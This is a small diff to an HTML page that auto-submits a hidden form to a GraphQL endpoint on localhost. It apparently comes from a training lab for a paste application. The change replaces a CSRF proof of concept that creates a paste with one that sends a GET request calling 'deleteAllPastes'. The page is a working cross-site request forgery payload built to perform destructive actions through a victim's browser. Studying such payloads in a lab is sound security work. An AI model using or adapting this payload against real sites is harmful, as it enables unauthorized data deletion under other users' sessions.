@@ -2,8 +2,8 @@
 <html>
   <body>
     <h1>This form is going to submit itself in 2 seconds...</h1>
-     <form id="auto_submit_form" method="POST" action="http://localhost:5013/graphql">
-       <input type="hidden" name="query" value="mutation { createPaste(title:&quot;CSRF&quot;, content:&quot;The PoC worked!&quot;, public:true, burn: false) { paste { id content title burn } }}"/>
+     <form id="auto_submit_form" method="GET" action="http://localhost:5013/graphql">
+       <input type="hidden" name="query" value="query { deleteAllPastes }"/>
        <input type="submit" value="Submit">
      </form>
   </body>
